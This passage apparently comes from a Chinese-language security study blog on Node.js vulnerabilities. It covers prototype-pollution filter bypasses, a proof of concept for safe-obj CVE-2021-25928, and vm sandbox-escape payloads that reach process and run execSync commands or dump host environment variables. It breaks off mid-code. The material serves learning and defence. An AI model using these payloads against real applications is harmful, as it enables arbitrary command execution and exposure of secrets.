+<p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p>
+<p>大致流程：</p>
+<p><code>object2.a=1=object1.a</code></p>
+<p><code>object2.__proto__=&#123;&quot;b&quot;: 2&#125;=object1.__proto__=object3.__proto__</code>–&gt;<code>object3=&#123;&quot;b&quot;: 2&#125;</code>–&gt;<code>object3.b=2</code></p>
+<hr>
+<h2 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h2><h3 id="proto-过滤"><a href="#proto-过滤" class="headerlink" title="__proto__过滤"></a>__proto__过滤</h3><p>过滤了<code>__proto__</code>可以考虑在末尾加空格<code>__proto__ </code>，或者使用上面提到的<code>obj.constructor.prototype</code>来代替，<code>obj.constructor.prototype==obj.__proto__</code></p>
+<p>即</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"constructor"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+        <span class="token property">"prototype"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+            <span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 等同于</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+        <span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="Undefsafe模块原型链污染"><a href="#Undefsafe模块原型链污染" class="headerlink" title="Undefsafe模块原型链污染"></a>Undefsafe模块原型链污染</h1><p>跳转链接：<a href="https://c1oudfl0w0.github.io/blog/2023/01/18/Undefsafe%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">https://c1oudfl0w0.github.io/blog/2023/11/18/Undefsafe模块原型链污染</a></p>
+<hr>
+<h1 id="ejs原型链污染"><a href="#ejs原型链污染" class="headerlink" title="ejs原型链污染"></a>ejs原型链污染</h1><p>跳转链接：<a href="https://c1oudfl0w0.github.io/blog/2024/01/19/ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">https://c1oudfl0w0.github.io/blog/2024/01/19/ejs原型链污染</a></p>
+<hr>
+<h1 id="safe-obj污染（CVE-2021-25928）"><a href="#safe-obj污染（CVE-2021-25928）" class="headerlink" title="safe-obj污染（CVE-2021-25928）"></a>safe-obj污染（CVE-2021-25928）</h1><p>safe-obj库中的漏洞点：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">expand</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> thing</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>path <span class="token operator">||</span> <span class="token keyword">typeof</span> thing <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  obj <span class="token operator">=</span> <span class="token function">isObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> obj <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">?</span> obj <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> props <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>props<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    obj<span class="token punctuation">[</span>props<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> thing<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> prop <span class="token operator">=</span> props<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>prop <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    _safe<span class="token punctuation">.</span><span class="token function">expand</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> props<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> thing<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接递归按照 <code>.</code> 做分隔写入 obj，很明显可以原型链污染</p>
+<p>poc：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> safeObj <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"safe-obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before : "</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span>
+safeObj<span class="token punctuation">.</span> <span class="token function">expand</span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token string">'__proto__.polluted'</span><span class="token punctuation">,</span><span class="token string">'Yes! Its Polluted'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After : "</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="vm沙盒逃逸"><a href="#vm沙盒逃逸" class="headerlink" title="vm沙盒逃逸"></a>vm沙盒逃逸</h1><p> vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性</li>
+</ul>
+<p><img src="/blog/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20240324002348583.png" alt="image-20240324002348583"></p>
+<p>demo：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">let</span> localvar <span class="token operator">=</span> <span class="token string">'initial value'</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> vmresult <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInThisContext</span><span class="token punctuation">(</span><span class="token string">'localvar = "123";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>vmresult<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localvar<span class="token punctuation">)</span>
+
+<span class="token comment">//123</span>
+<span class="token comment">//initial value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即沙箱的环境不会对当前作用域产生影响</p>
+<ul>
+<li><p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），这里设 v8 为这个沙箱对象，在当前<code>global</code>外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问 global 中的属性。</p>
+</li>
+<li><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同</p>
+</li>
+</ul>
+<p><img src="/blog/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20240324002905769.png" alt="image-20240324002905769"></p>
+<p>demo：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> util <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'util'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+global<span class="token punctuation">.</span>globalVar <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">globalVar</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span><span class="token string">'globalVar *= 2;'</span><span class="token punctuation">,</span> sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>util<span class="token punctuation">.</span><span class="token function">inspect</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; globalVar: 2 &#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>util<span class="token punctuation">.</span><span class="token function">inspect</span><span class="token punctuation">(</span>globalVar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><code>vm.runInNewContext(code[, sandbox][, options])</code>：creatContext 和 runInContext 的结合版，传入要执行的代码和沙箱对象。</li>
+<li><code>vm.Script类</code> ：vm.Script 类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</li>
+<li><code>new vm.Script(code, options)</code>：创建一个新的 vm.Script 对象只编译代码但不会执行它。编译过的 vm.Script 此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</li>
+</ul>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> util <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'util'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">animal</span><span class="token operator">:</span><span class="token string">"cat"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">count</span><span class="token operator">:</span><span class="token number">2</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>Script</span><span class="token punctuation">(</span><span class="token string">'count +=1;name = "kitty"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 自己设置的预编译脚本</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+script<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 执行脚本</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>util<span class="token punctuation">.</span><span class="token function">inspect</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//&#123; animal: 'cat', count: 3, name: 'kitty' &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>vm 可以通过构造语句来逃逸到主程序进行命令执行</p>
+<p>具体的思路就是<strong>获取process对象</strong>，然后<code>require(&#39;child_process&#39;)</code></p>
+<p>demo：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">this.constructor.constructor('return this.process.env')()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>执行之后可以获取到主程序环境中的环境变量</p>
+<p>上面的例子等价于下面的代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>Script</span><span class="token punctuation">(</span><span class="token string">"this.constructor.constructor('return this.process.env')()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+env <span class="token operator">=</span> script<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建vm环境时，首先要初始化一个对象<code>sandbox</code>，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象</p>
+<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用 Function 对象构造一个函数并执行<code>Function()</code>（此时Function对象的上下文环境是处于主程序中的）</p>
+<p>这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量</p>
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018110606476.png" alt="image-20231018110606476"></p>
+<p>配合前面的<code>chile_process.exec()</code>就可以执行任意命令</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">const process = this.constructor.constructor('return this.process')();
+process.mainModule.require('child_process').execSync('whoami').toString()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="关于this"><a href="#关于this" class="headerlink" title="关于this"></a>关于this</h3><p>以这个为例</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">m + n</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">m</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">n</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> res <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对于前面的poc，我们能不能把<code>this.toString.constructor(&#39;return process&#39;)()</code>中的 this 换成<code>&#123;&#125;</code>呢？答案是不能</p>
+<p><code>&#123;&#125;</code>的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到 global 下的</p>
+<p>如果我们将 this 换成 m 或 n 也是访问不到的，因为<strong>数字，字符串，布尔</strong>这些都是 primitive 类型，他们在传递的过程中是<strong>将值传递过去而不是引用</strong>（类似于函数传递形参），在沙盒内使用的m、n已经不是原来的m、n了，所以无法利用</p>
+<p>不过只要我们将m、n改成其他类型就可以利用了</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> inspect <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'util'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>inspect
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>Script</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+(e => &#123;
+    const y1 = x.toString.constructor('return process')()  // 用m,n,x都行
+    return y1.mainModule.require('child_process').execSync('whoami').toString()
+&#125;)()
+
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">m</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token literal-property property">n</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">regexp</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token comment">//只要m,n,x不为数字，字符串，布尔等都行</span>
+
+<span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> res <span class="token operator">=</span> script<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h2 id="bypass-2"><a href="#bypass-2" class="headerlink" title="bypass"></a>bypass</h2><h3 id="this为null"><a href="#this为null" class="headerlink" title="this为null"></a>this为null</h3><blockquote>
+<p>本质是重写对象</p>
+</blockquote>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> res <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时<code>this-&gt;null</code>，无法像之前一样逃逸</p>
+<p>这时候就得用到函数的一个内置对象属性<code>arguments.callee.caller</code>，它返回的是函数的调用者</p>
+<p>上面演示的沙箱逃逸其实就是<strong>找到一个沙箱外的对象，并调用其中的方法</strong></p>
+<p>这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> script <span class="token operator">=</span> 
+<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">(() => &#123;
+    const a = &#123;&#125;
+    a.toString = function () &#123;
+      const cc = arguments.callee.caller;
+      const p = (cc.constructor.constructor('return process'))();
+      return p.mainModule.require('child_process').execSync('whoami').toString()
+    &#125;
+    return a
+  &#125;)()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> res <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样就可以成功进行命令执行</p>
+<p>分析代码，首先是箭头函数</p>
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231018111900997.png" alt="image-20231018111900997"></p>
+<p>类似于匿名函数，并且简化了函数定义</p>
+<p>demo：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token parameter">x</span> <span class="token operator">=></span> x <span class="token operator">*</span> x
+<span class="token comment">// 相当于</span>
+<span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> x <span class="token operator">*</span> x<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而上面的<code>() =&gt; &#123;...&#125;</code>就相当于定义了一个无参匿名函数，然后进行调用</p>
+<p>回到bypass，代码重写了沙盒对象中的toString方法，然后再console.log触发，通过<code>arguments.callee.caller</code>获取到了一个沙盒外的对象，进而和上面一样获取process</p>
+<hr>
+<h3 id="proxy劫持"><a href="#proxy劫持" class="headerlink" title="proxy劫持"></a>proxy劫持</h3><p>如果沙箱外没有执行字符串的相关操作来触发这个toString（如上面的<code>console.log(&#39;Hello &#39; + res)</code>），并且也没有可以用来进行恶意重写的函数（如上面的<code>a.toString</code>），我们可以用Proxy来劫持属性</p>
+<p>proxy就是一个hook函数，在我们去访问对象的属性时（不管是否存在）都会触发这个函数</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> script <span class="token operator">=</span> 
+<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+(() =>&#123;
+    const a = new Proxy(&#123;&#125;, &#123;
+        get: function()&#123;
+            const cc = arguments.callee.caller;
+            const p = (cc.constructor.constructor('return process'))();
+            return p.mainModule.require('child_process').execSync('whoami').toString();
+        &#125;
+    &#125;)
+    return a
+&#125;)()
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm<span class="token punctuation">.</span>createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> res <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
